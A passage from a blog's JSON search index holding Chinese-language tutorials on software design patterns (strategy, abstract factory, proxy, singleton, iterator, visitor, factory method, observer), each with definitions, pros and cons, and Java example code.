System.out.println(\u0026#34;具体策略B被使用！\u0026#34;); } } 环境类 持有一个策略类的引用，最终给客户端调用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package pers.designPattern.strategy; public class Context { private Strategy strategy; public Strategy getStrategy() { return strategy; } public void setStrategy(Strategy strategy) { this.strategy = strategy; } public void strategyMethod() { strategy.strategyMethod(); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.strategy; public class StrategyClient { public static void main(String[] args) { Context context = new Context(); Strategy strategy = new ConcreteStrategyA(); context.setStrategy(strategy); context.strategyMethod(); System.out.println(\u0026#34;___________________\u0026#34;); strategy = new ConcreteStrategyB(); context.setStrategy(strategy); context.strategyMethod(); } } 运行结果：\n具体策略A被使用！ ___________________ 具体策略B被使用！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/","title":"设计模式——策略模式"},{"content":"设计模式——抽象工厂模式 一、基本概念 1. 定义 抽象工厂模式（英语：Abstract factory pattern）是一种软件开发设计模式。抽象工厂模式提供了一种方式，可以将一组具有同一主题的单独的工厂封装起来。\n在正常使用中，客户端程序需要创建抽象工厂的具体实现，然后使用抽象工厂作为接口来创建这一主题的具体对象。客户端程序不需要知道（或关心）它从这些内部的工厂方法中获得对象的具体类型，因为客户端程序仅使用这些对象的通用接口。抽象工厂模式将一组对象的实现细节与他们的一般使用分离开来。\n2. 优缺点 优点：\n用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程。 灵活性增强，对于新产品的创建，只需多写一个相应的工厂类。 典型的解耦框架。高层模块只需要知道产品的抽象类，无须关心其他实现类，满足迪米特法则、依赖倒置原则和里氏替换原则。 可以在类的内部对产品族中相关联的多等级产品共同管理，而不必专门引入多个新的类来进行管理。 当需要产品族时，抽象工厂可以保证客户端始终只使用同一个产品的产品组。 抽象工厂增强了程序的可扩展性，当增加一个新的产品族时，不需要修改原代码，满足开闭原则。 缺点：\n当产品族中需要增加一个新的产品时，所有的工厂类都需要进行修改。增加了系统的抽象性和理解难度。 3. 结构 抽象工厂模式的主要角色如下。\n抽象工厂（Abstract Factory）：提供了创建产品的接口，它包含多个创建产品的方法 newProduct()，可以创建多个不同等级的产品； 具体工厂（Concrete Factory）：主要是实现抽象工厂中的多个抽象方法，完成具体产品的创建。 抽象产品（Product）：定义了产品的规范，描述了产品的主要特性和功能，抽象工厂模式有多个抽象产品。 具体产品（ConcreteProduct）：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间是多对一的关系。 二、代码实现 AbstractFactory.java:\n1 2 3 4 5 6 7 8 9 package pers.designPattern.abstractFactory; /* * 抽象工厂 * */ abstract class AbstractFactory { public abstract Color getColor(String color); public abstract Shape getShape(String shape); } ShapeFactory.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package pers.designPattern.abstractFactory; /* * 形状工厂 * */ interface Shape { void creatShape(); } class Rectangle implements Shape { @Override public void creatShape() { System.out.println(\u0026#34;创建一个矩形...\u0026#34;); } } class Circle implements Shape { @Override public void creatShape() { System.out.println(\u0026#34;创建一个圆形...\u0026#34;); } } class Square implements Shape { @Override public void creatShape() { System.out.println(\u0026#34;创建一个正方形...\u0026#34;); } } /* * 创建扩展了 AbstractFactory 的工厂类，基于给定的信息生成实体类的对象 * */ public class ShapeFactory extends AbstractFactory { @Override public Color getColor(String color) { return null; } @Override public Shape getShape(String shape) { switch (shape) { case \u0026#34;circle\u0026#34;: return new Circle(); case \u0026#34;rectangle\u0026#34;: return new Rectangle(); case \u0026#34;square\u0026#34;: return new Square(); default: return null; } } } ColorFactory.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package pers.designPattern.abstractFactory; /* * 颜色工厂 * */ interface Color { void fillColor(); } class Red implements Color { @Override public void fillColor() { System.out.println(\u0026#34;喷涂红色...\u0026#34;); } } class Green implements Color { @Override public void fillColor() { System.out.println(\u0026#34;喷涂绿色...\u0026#34;); } } class Blue implements Color { @Override public void fillColor() { System.out.println(\u0026#34;喷涂蓝色...\u0026#34;); } } public class ColorFactory extends AbstractFactory { @Override public Color getColor(String color) { switch (color) { case \u0026#34;red\u0026#34;: return new Red(); case \u0026#34;green\u0026#34;: return new Green(); case \u0026#34;blue\u0026#34;: return new Blue(); default: return null; } } @Override public Shape getShape(String shape) { return null; } } FactoryProcuder.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package pers.designPattern.abstractFactory; public class FactoryProducer { /* * 创建一个工厂生成器类，通过传递形状或颜色信息来获取工厂 * */ public static AbstractFactory getFactory(String choice) { if (choice.equals(\u0026#34;color\u0026#34;)) { return new ColorFactory(); } else if (choice.equals(\u0026#34;shape\u0026#34;)) { return new ShapeFactory(); } else { return null; } } } AbstractFactory.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package pers.designPattern.abstractFactory; import java.util.Objects; public class AbstractFactoryClient { /* * 客户 * */ public static void main(String[] args) { AbstractFactory sf = FactoryProducer.getFactory(\u0026#34;shape\u0026#34;); Shape circle = Objects.requireNonNull(sf).getShape(\u0026#34;circle\u0026#34;); circle.creatShape(); } } 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","title":"设计模式——抽象工厂模式"},{"content":"设计模式——代理模式 一、基本概念 1. 定义 代理模式（英语：Proxy Pattern）是程序设计中的一种设计模式。\n所谓的代理者是指一个类别可以作为其它东西的接口。代理者可以作任何东西的接口：网络连接、存储器中的大对象、文件或其它昂贵或无法复制的资源。\n2. 优缺点 优点：\n代理模式在客户端与目标对象之间起到一个中介作用和保护目标对象的作用； 代理对象可以扩展目标对象的功能； 代理模式能将客户端与目标对象分离，在一定程度上降低了系统的耦合度，增加了程序的可扩展性 缺点：\n代理模式会造成系统设计中类的数量增加； 在客户端和目标对象之间增加一个代理对象，会造成请求处理速度变慢； 增加了系统的复杂度。 3. 结构 抽象主题（Subject）类：通过接口或抽象类声明真实主题和代理对象实现的业务方法； 真实主题（Real Subject）类：实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象； 代理（Proxy）类：提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能。 二、代码实现 抽象主题类 通过接口或抽象类声明真实主题和代理对象实现的业务方法：\n1 2 3 4 5 package pers.designPattern.proxy; public interface Subject { void request(); } 真实主题类 实现了抽象主题中的具体业务，是代理对象所代表的真实对象，是最终要引用的对象：\n1 2 3 4 5 6 7 8 package pers.designPattern.proxy; public class RealSubject implements Subject { @Override public void request() { System.out.println(\u0026#34;访问真实主题！\u0026#34;); } } 代理类 提供了与真实主题相同的接口，其内部含有对真实主题的引用，它可以访问、控制或扩展真实主题的功能：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package pers.designPattern.proxy; public class Proxy implements Subject { private RealSubject realSubject; @Override public void request() { if (realSubject == null) { realSubject = new RealSubject(); } preRequest(); realSubject.request(); postRequest(); } public void preRequest() { System.out.println(\u0026#34;访问真实主题前的预处理...\u0026#34;); } public void postRequest() { System.out.println(\u0026#34;访问真实主题后的处理...\u0026#34;); } } 客户类 1 2 3 4 5 6 7 8 package pers.designPattern.proxy; public class ProxyClient { public static void main(String[] args) { Proxy proxy = new Proxy(); proxy.request(); } } 运行结果：\n访问真实主题前的预处理... 访问真实主题！ 访问真实主题后的处理... 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","title":"设计模式——代理模式"},{"content":"设计模式——单例模式 一、定义 单例模式，也叫单子模式，是一种常用的软件设计模式，属于创建型模式的一种。在应用这个模式时，单例对象的类必须保证只有一个实例存在。许多时候整个系统只需要拥有一个的全局对象，这样有利于我们协调系统整体的行为。\n比如在某个服务器程序中，该服务器的配置信息存放在一个文件中，这些配置数据由一个单例对象统一读取，然后服务进程中的其他对象再通过这个单例对象获取这些配置信息。又比如，Windows 中只能打开一个任务管理器，这样可以避免因打开多个任务管理器窗口而造成内存资源的浪费，或出现各个窗口显示内容的不一致等错误。\n二、特点 单例类只有一个实例对象； 该单例对象必须由单例类自行创建； 单例类对外提供一个访问该单例的全局访问点。 三、优缺点 单例模式的优点：\n单例模式可以保证内存里只有一个实例，减少了内存的开销。 可以避免对资源的多重占用。 单例模式设置全局访问点，可以优化和共享资源的访问。 单例模式的缺点：\n单例模式一般没有接口，扩展困难。如果要扩展，则除了修改原来的代码，没有第二种途径，违背开闭原则。 在并发测试中，单例模式不利于代码调试。在调试过程中，如果单例中的代码没有执行完，也不能模拟生成一个新的对象。 单例模式的功能代码通常写在一个类中，如果功能设计不合理，则很容易违背单一职责原则。 四、应用场景 单例模式的应用场景主要有以下几个方面：\n需要频繁创建的一些类，使用单例可以降低系统的内存压力，减少 GC。 某类只要求生成一个对象的时候，如一个班中的班长、每个人的身份证号等。 某些类创建实例时占用资源较多，或实例化耗时较长，且经常使用。 某类需要频繁实例化，而创建的对象又频繁被销毁的时候，如多线程的线程池、网络连接池等。 频繁访问数据库或文件的对象。 对于一些控制硬件级别的操作，或者从系统上来讲应当是单一控制逻辑的操作，如果有多个实例，则系统会完全乱套。 当对象需要被共享的场合。由于单例模式只允许创建一个对象，共享该对象可以节省内存，并加快对象访问速度。如 Web 中的配置对象、数据库的连接池等。 五、实现思路 实现单例模式的思路：\n一个类能返回对象一个引用(永远是同一个)和一个获得该实例的方法（必须是静态方法，通常使用 getInstance 这个名称）； 当我们调用这个方法时，如果类持有的引用不为空就返回这个引用，如果类保持的引用为空就创建该类的实例并将实例的引用赋予该类保持的引用； 同时我们还将该类的构造函数定义为私有方法，这样其他处的代码就无法通过调用该类的构造函数来实例化该类的对象，只有通过该类提供的静态方法来得到该类的唯一实例。 UML ：\n单例模式在多线程的应用场合下必须小心使用：\n如果当唯一实例尚未创建时，有两个线程同时调用创建方法，那么它们同时没有检测到唯一实例的存在，从而同时各自创建了一个实例，这样就有两个实例被构造出来，从而违反了单例模式中实例唯一的原则。 解决这个问题的办法是为指示类是否已经实例化的变量提供一个互斥锁(虽然这样会降低效率)。\n六、单例模式的实现 单例模式通常有两种实现形式：懒汉式单例与饿汉式单例。\n懒汉式单例 1. 线程不安全的懒汉式 特点：因为没有加锁 synchronized，所以在多线程时不能正常工作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package pers.designPattern.singleton; public class NonThreadSafeLazy { /* * 线程不安全的懒汉式 * */ private static NonThreadSafeLazy instance = null; private NonThreadSafeLazy() { // 避免在外部实例化 } public static NonThreadSafeLazy getInstance() { if (instance == null) { instance = new NonThreadSafeLazy(); } return instance; } } 2. 线程安全的懒汉式 特点：这种实现方式第一次调用才初始化实例，避免内存浪费；但是效率很低，因为这种加锁方式会影响效率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.designPattern.singleton; public class ThreadSafeLazy { /* * 线程安全的懒汉式 * */ private static ThreadSafeLazy instance; // 保证 instance 在所有线程中同步 private ThreadSafeLazy() {} public static synchronized ThreadSafeLazy getInstance() { // getInstance 方法前加 synchronized 为了保证线程安全 if (instance == null) { instance = new ThreadSafeLazy(); } return instance; } } 3. 双检锁的懒汉式 特点：采用双检索（DCL，即 double-checked locking）模式，能够保证线程安全且在多线程情况下能保持高性能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.designPattern.singleton; public class DCLLazy { /* * 采用双检锁（DCL，double-checked locking）实现的懒汉式 * */ private static volatile DCLLazy instance; private DCLLazy() {} public static DCLLazy getInstance() { if (instance == null) { synchronized (DCLLazy.class) { if (instance == null) instance = new DCLLazy(); } } return instance; } } 4. 静态内部类的懒汉式（推荐） 加载一个类时，其内部类不会同时被加载。一个类被加载，当且仅当其某个静态成员（静态域、构造器、静态方法等）被调用时发生。 由于在调用 StaticSingleton.getInstance() 的时候，才会对单例进行初始化，而且通过反射，是不能从外部类获取内部类的属性的；由于静态内部类的特性，只有在其被第一次引用的时候才会被加载，所以可以保证其线程安全性。\n特点：兼顾了懒汉模式的内存优化（使用时才初始化）以及饿汉模式的安全性（不会被反射入侵）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package pers.designPattern.singleton; public class StaticInnerClassLazy { /* * 采用静态内部类实现的懒汉式 * */ private static class StaticInnerClassLazyHolder { private static final StaticInnerClassLazy instance = new StaticInnerClassLazy(); } private StaticInnerClassLazy() {} public static StaticInnerClassLazy getInstance() { return StaticInnerClassLazyHolder.instance; } } 饿汉式单例模式 1. 饿汉式 特点：没有加锁，执行效率会提高；但是类加载时就初始化实例，浪费内存。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package pers.designPattern.singleton; public class Hungry { /* * 饿汉式单例模式 * */ private static Hungry instance = new Hungry(); private Hungry() {} public static Hungry getInstance() { return instance; } } 2. 枚举实现饿汉式 特点：创建枚举默认就是线程安全的，所以不需要担心double checked locking，而且还能防止反序列化导致重新创建新的对象。保证只有一个实例（即使使用反射机制也无法多次实例化一个枚举量）。\n1 2 3 4 5 6 7 8 package pers.designPattern.singleton; public enum EnumerationHungry { /* * 采用枚举的方式实现饿汉式单例模式 * */ INSTANCE; } 参考：\n菜鸟教程 C语言网 https://refactoringguru.cn/ ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","title":"设计模式——单例模式"},{"content":"设计模式——迭代器模式 一、基本概念 1. 定义 迭代器模式（Iterator）：是一种最简单也最常见的设计模式。它可以让用户透过特定的接口巡访容器中的每一个元素而不用了解底层的实现。\n2. 优缺点 优点：\n访问一个聚合对象的内容而无须暴露它的内部表示； 遍历任务交由迭代器完成，这简化了聚合类； 它支持以不同方式遍历一个聚合，甚至可以自定义迭代器的子类以支持新的遍历； 增加新的聚合类和迭代器类都很方便，无须修改原有代码； 封装性良好，为遍历不同的聚合结构提供一个统一的接口。 缺点：\n增加了类的个数，这在一定程度上增加了系统的复杂性。 3. 结构 抽象聚合（Aggregate）角色：定义存储、添加、删除聚合对象以及创建迭代器对象的接口； 具体聚合（ConcreteAggregate）角色：实现抽象聚合类，返回一个具体迭代器的实例； 抽象迭代器（Iterator）角色：定义访问和遍历聚合元素的接口，通常包含 hasNext()、first()、next() 等方法； 具体迭代器（Concretelterator）角色：实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置。 二、代码实现 抽象迭代器 定义访问和遍历聚合元素的接口，通常包含 hasNext()、first()、next() 等方法：\n1 2 3 4 5 6 7 package pers.designPattern.iterator; public interface Iterator { Object first(); Object next(); boolean hasNext(); } 具体迭代器 实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package pers.designPattern.iterator; import java.util.List; public class ConcreteIterator implements Iterator { private List\u0026lt;Object\u0026gt; list = null; private int index = -1; public ConcreteIterator(List\u0026lt;Object\u0026gt; list) { this.list = list; } @Override public Object first() { index = 0; return list.get(index); } @Override public Object next() { Object obj = null; if (hasNext()) { obj = list.get(++index); } return obj; } @Override public boolean hasNext() { return index \u0026lt; list.size() - 1; } } 抽象聚合 定义存储、添加、删除聚合对象以及创建迭代器对象的接口：\n1 2 3 4 5 6 7 package pers.designPattern.iterator; public interface Aggregate { public void add(Object obj); public void remove(Object obj); public Iterator getIterator(); } 具体聚合 实现抽象聚合类，返回一个具体迭代器的实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package pers.designPattern.iterator; import java.util.ArrayList; import java.util.List; public class ConcreteAggregate implements Aggregate { private List\u0026lt;Object\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); @Override public void add(Object obj) { list.add(obj); } @Override public void remove(Object obj) { list.remove(obj); } @Override public Iterator getIterator() { return (new ConcreteIterator(list)); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package pers.designPattern.iterator; public class IteratorClient { public static void main(String[] args) { Aggregate aggregate = new ConcreteAggregate(); aggregate.add(\u0026#34;西瓜\u0026#34;); aggregate.add(\u0026#34;橘子\u0026#34;); aggregate.add(\u0026#34;苹果\u0026#34;); aggregate.add(\u0026#34;草莓\u0026#34;); System.out.println(\u0026#34;遍历集合：\u0026#34;); Iterator iterator = aggregate.getIterator(); while (iterator.hasNext()) { Object obj = iterator.next(); System.out.print(obj.toString() + \u0026#34;\\t\u0026#34;); } Object obj = iterator.first(); System.out.println(\u0026#34;\\nFirst: \u0026#34; + obj.toString()); } } 运行结果：\n遍历集合： 西瓜\t橘子\t苹果\t草莓\tFirst: 西瓜 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"设计模式——迭代器模式"},{"content":"设计模式——访问者模式 一、基本概念 1. 定义 访问者（Visitor）模式：将作用于某种数据结构中的各元素的操作分离出来封装成独立的类，使其在不改变数据结构的前提下可以添加作用于这些元素的新的操作，为数据结构中的每个元素提供多种访问方式。它将对数据的操作与数据结构进行分离，是行为类模式中最复杂的一种模式。\n访问者模式是一种行为设计模式， 它能将算法与其所作用的对象隔离开来。\n2. 优缺点 优点：\n扩展性好。能够在不修改对象结构中的元素的情况下，为对象结构中的元素添加新的功能； 复用性好。可以通过访问者来定义整个对象结构通用的功能，从而提高系统的复用程度； 灵活性好。访问者模式将数据结构与作用于结构上的操作解耦，使得操作集合可相对自由地演化而不影响系统的数据结构； 符合单一职责原则。访问者模式把相关的行为封装在一起，构成一个访问者，使每一个访问者的功能都比较单一。 缺点：\n增加新的元素类很困难。在访问者模式中，每增加一个新的元素类，都要在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”； 破坏封装。访问者模式中具体元素对访问者公布细节，这破坏了对象的封装性； 违反了依赖倒置原则。访问者模式依赖了具体类，而没有依赖抽象类。 3. 结构 抽象访问者（Visitor）角色：定义一个访问具体元素的接口，为每个具体元素类对应一个访问操作 visit() ，该操作中的参数类型标识了被访问的具体元素； 具体访问者（ConcreteVisitor）角色：实现抽象访问者角色中声明的各个访问操作，确定访问者访问一个元素时该做什么； 抽象元素（Element）角色：声明一个包含接受操作 accept() 的接口，被接受的访问者对象作为 accept() 方法的参数； 具体元素（ConcreteElement）角色：实现抽象元素角色提供的 accept() 操作，其方法体通常都是 visitor.visit(this) ，另外具体元素中可能还包含本身业务逻辑的相关操作； 对象结构（Object Structure）角色：是一个包含元素角色的容器，提供让访问者对象遍历容器中的所有元素的方法，通常由 List、Set、Map 等聚合类实现。 二、代码实现 抽象访问者 定义一个访问具体元素的接口，为每个具体元素类对应一个访问操作 visit() ，该操作中的参数类型标识了被访问的具体元素：\n1 2 3 4 5 6 package pers.designPattern.visitor; public interface Visitor { void visit(ConcreteElementA element); void visit(ConcreteElementB element); } 具体访问者 实现抽象访问者角色中声明的各个访问操作，确定访问者访问一个元素时该做什么：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.visitor; public class ConcreteVisitorA implements Visitor { @Override public void visit(ConcreteElementA element) { System.out.println(\u0026#34;具体访问者A访问: \u0026#34; + element.operationA()); } @Override public void visit(ConcreteElementB element) { System.out.println(\u0026#34;具体访问者A访问: \u0026#34; + element.operationB()); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.visitor; public class ConcreteVisitorB implements Visitor { @Override public void visit(ConcreteElementA element) { System.out.println(\u0026#34;具体访问者B访问: \u0026#34; + element.operationA()); } @Override public void visit(ConcreteElementB element) { System.out.println(\u0026#34;具体访问者B访问: \u0026#34; + element.operationB()); } } 抽象元素角色 声明一个包含接受操作 accept() 的接口，被接受的访问者对象作为 accept() 方法的参数：\n1 2 3 4 5 package pers.designPattern.visitor; public interface Element { void accept(Visitor visitor); } 具体元素角色 实现抽象元素角色提供的 accept() 操作，其方法体通常都是 visitor.visit(this) ，另外具体元素中可能还包含本身业务逻辑的相关操作：\n1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.visitor; public class ConcreteElementA implements Element { @Override public void accept(Visitor visitor) { visitor.visit(this); } public String operationA() { return \u0026#34;具体元素A的操作!\u0026#34;; } } 1 2 3 4 5 6 7 8 9 10 11 12 package pers.designPattern.visitor; public class ConcreteElementB implements Element { @Override public void accept(Visitor visitor) { visitor.visit(this); } public String operationB() { return \u0026#34;具体元素B的操作!\u0026#34;; } } 对象结构角色 是一个包含元素角色的容器，提供让访问者对象遍历容器中的所有元素的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package pers.designPattern.visitor; import java.util.ArrayList; import java.util.List; public class ObjectStructure { private List\u0026lt;Element\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); public void accept(Visitor visitor) { for (Element element : list) { element.accept(visitor); } } public void add(Element element) { list.add(element); } public void remove(Element element) { list.remove(element); } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 package pers.designPattern.visitor; public class VisitorClient { public static void main(String[] args) { ObjectStructure objectStructure = new ObjectStructure(); objectStructure.add(new ConcreteElementA()); objectStructure.add(new ConcreteElementB()); Visitor visitor = new ConcreteVisitorA(); objectStructure.accept(visitor); System.out.println(\u0026#34;_______________\u0026#34;); visitor = new ConcreteVisitorB(); objectStructure.accept(visitor); } } 运行结果：\n具体访问者A访问: 具体元素A的操作! 具体访问者A访问: 具体元素B的操作! _______________ 具体访问者B访问: 具体元素A的操作! 具体访问者B访问: 具体元素B的操作! 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"设计模式——访问者模式"},{"content":"设计模式——工厂方法模式 一、基本概念 1. 定义 工厂方法模式（英语：Factory method pattern）是一种实现了“工厂”概念的面向对象设计模式。就像其他创建型模式一样，它也是处理在不指定对象具体类型的情况下创建对象的问题。工厂方法模式的实质是“定义一个创建对象的接口，但让实现这个接口的类来决定实例化哪个类。工厂方法让类的实例化推迟到子类中进行。”\n2. 优缺点 优点：\n用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程。 灵活性增强，对于新产品的创建，只需多写一个相应的工厂类。 典型的解耦框架。高层模块只需要知道产品的抽象类，无须关心其他实现类，满足迪米特法则、依赖倒置原则和里氏替换原则。 缺点：\n类的个数容易过多，增加复杂度 增加了系统的抽象性和理解难度 抽象产品只能生产一种产品，此弊端可使用抽象工厂模式解决。 3. 结构 工厂方法模式的主要角色如下：\n抽象工厂（Abstract Factory）：提供了创建产品的接口，调用者通过它访问具体工厂的工厂方法 newProduct() 来创建产品； 具体工厂（ConcreteFactory）：主要是实现抽象工厂中的抽象方法，完成具体产品的创建； 抽象产品（Product）：定义了产品的规范，描述了产品的主要特性和功能； 具体产品（ConcreteProduct）：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应 二、代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 package pers.designPattern.factory; import java.util.Scanner; public class FactoryClient { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); String productName = scanner.nextLine(); Shape product; Factory factory; if (productName.equals(\u0026#34;Circle\u0026#34;)) { factory = new CircleFactory(); } else { factory = new RectangleFactory(); } product = factory.createShape(); product.show(); } } /* * 产品 * */ interface Shape { /* * 抽象产品 * */ void show(); } class Rectangle implements Shape { /* * 具体产品：矩形 * */ @Override public void show() { System.out.println(\u0026#34;I\u0026#39;m a rectangle.\u0026#34;); } } class Circle implements Shape { /* * 具体产品：圆 * */ @Override public void show() { System.out.println(\u0026#34;I\u0026#39;m a circle.\u0026#34;); } } /* * 工厂 * */ interface Factory { /* * 抽象工厂 * */ public Shape createShape(); } class RectangleFactory implements Factory { /* * 生产矩形的工厂 * */ @Override public Rectangle createShape() { System.out.println(\u0026#34;正在生产矩形...\u0026#34;); return new Rectangle(); } } class CircleFactory implements Factory { /* * 生产圆形的工厂 * */ @Override public Circle createShape() { System.out.println(\u0026#34;正在生产圆形...\u0026#34;); return new Circle(); } } 参考：\n菜鸟教程 C语言网 https://refactoringguru.cn/ ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/","title":"设计模式——工厂方法模式"},{"content":"设计模式——观察者模式 一、基本概念 1. 定义 观察者（Observer）模式：指多个对象间存在一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。这种模式有时又称作发布-订阅模式、模型-视图模式，它是对象行为型模式。\n观察者模式是一种行为设计模式， 允许你定义一种订阅机制， 可在对象事件发生时通知多个 “观察” 该对象的其他对象。\n2. 优缺点 优点：\n降低了目标与观察者之间的耦合关系，两者之间是抽象耦合关系。符合依赖倒置原则； 目标与观察者之间建立了一套触发机制。 缺点：\n目标与观察者之间的依赖关系并没有完全解除，而且有可能出现循环引用； 当观察者对象很多时，通知的发布会花费很多时间，影响程序的效率。 3. 结构 抽象主题（Subject）角色：也叫抽象目标类，它提供了一个用于保存观察者对象的聚集类和增加、删除观察者对象的方法，以及通知所有观察者的抽象方法； 具体主题（Concrete Subject）角色：也叫具体目标类，它实现抽象目标中的通知方法，当具体主题的内部状态发生改变时，通知所有注册过的观察者对象； 抽象观察者（Observer）角色：它是一个抽象类或接口，它包含了一个更新自己的抽象方法，当接到具体主题的更改通知时被调用； 具体观察者（Concrete Observer）角色：实现抽象观察者中定义的抽象方法，以便在得到目标的更改通知时更新自身的状态。 二、代码实现 抽象观察者 是一个抽象类或接口，它包含了一个更新自己的抽象方法，当接到具体主题的更改通知时被调用：\n1 2 3 4 5 package pers.designPattern.observer; public interface Observer { void response(); } 具体观察者 实现抽象观察者中定义的抽象方法，以便在得到目标的更改通知时更新自身的状态：\n1 2 3 4 5 6 7 8 package pers.designPattern.observer; public class ConcreteObserver1 implements Observer { @Override public void response() { System.out.println(\u0026#34;观察者1做出反应！\u0026#34;); } } 1 2 3 4 5 6 7 8 package pers.designPattern.observer; public class ConcreteObserver2 implements Observer { @Override public void response() { System.out.println(\u0026#34;观察者2做出反应！\u0026#34;); } } 抽象主题 它提供了一个用于保存观察者对象的聚集类和增加、删除观察者对象的方法，以及通知所有观察者的抽象方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.designPattern.observer; import java.util.ArrayList; import java.util.List; public abstract class Subject { protected List\u0026lt;Observer\u0026gt; observers = new ArrayList\u0026lt;\u0026gt;(); public void add(Observer observer) { observers.add(observer); } public void remove(Observer observer) { observers.remove(observer); } public abstract void notifyObserver(); } 具体主题 它实现抽象目标中的通知方法，当具体主题的内部状态发生改变时，通知所有注册过的观察者对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.observer; public class ConcreteSubject extends Subject { @Override public void notifyObserver() { System.out.println(\u0026#34;具体目标发生改变...\u0026#34;); System.out.println(\u0026#34;----------------\u0026#34;); for (Observer obj: observers) { obj.response(); } } } 客户类 1 2 3 4 5 6 7 8 9 10 11 12 13 package pers.designPattern.observer; public class ObserverClient { public static void main(String[] args) { Subject subject = new ConcreteSubject(); Observer observer1 = new ConcreteObserver1(); Observer observer2 = new ConcreteObserver2(); subject.add(observer1); subject.add(observer2); subject.notifyObserver(); } } 运行结果：\n具体目标发生改变... ---------------- 观察者1做出反应！ 观察者2做出反应！ 参考：\n菜鸟教程 C语言网 Refactoring.Guru ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"设计模式——观察者模式"},{"content":"设计模式——建造者模式 一、基本概念 1. 定义 建造者模式（英：Builder 